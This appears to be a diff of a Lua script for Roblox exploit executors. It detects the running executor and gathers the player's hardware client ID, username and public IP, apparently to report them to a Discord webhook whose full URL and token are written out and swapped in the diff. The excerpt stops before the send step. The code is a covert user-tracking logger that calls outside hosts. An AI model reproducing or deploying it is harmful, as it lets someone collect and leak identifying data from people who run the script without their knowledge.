@@ -1,14 +1,18 @@
 req = http_request or request or HttpPost or syn.request
 local webhookcheck =
-    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
-    secure_load and "Sentinel" or
-    KRNL_LOADED and "Krnl" or
-    SONA_LOADED and "Sona" or
-    "Kid with shit exploit"
+       is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+       secure_load and "Sentinel" or
+       KRNL_LOADED and "Krnl" or
+       WrapGlobal and "WeAreDevs" or
+       jit and "EasyExploits" or
+       IS_VIVA_LOADED and "VIVA X" or
+       IS_COCO_LOADED and "Coco Z" or
+       OXYGEN_LOADED and "Oxygen U" or
+       "Undetected"
 
 local HWIDCHECK = game:GetService("RbxAnalyticsService"):GetClientId()    
 local name = game:GetService("Players").LocalPlayer.Name
-local WebhookURL = "https://discord.com/api/webhooks/1147580365196767312/aVw-fr_ovgiQF-bKgIsh1C9kEFqefiLHR_tWs8uBpEKN2bmz6vgZEeYINOLl8pBazcHt"
+local WebhookURL = "https://discord.com/api/webhooks/1150921793775865866/tsFUqzpsp-Nt4yJYAheZR3Ez__Z6N7_TBNx1iiQtmyP-lW0KdKiFjZuJjYYHcb_R0gHn"
 local getIPResponse = req({
     Url = "https://api.ipify.org/?format=json",
     Method = "GET"
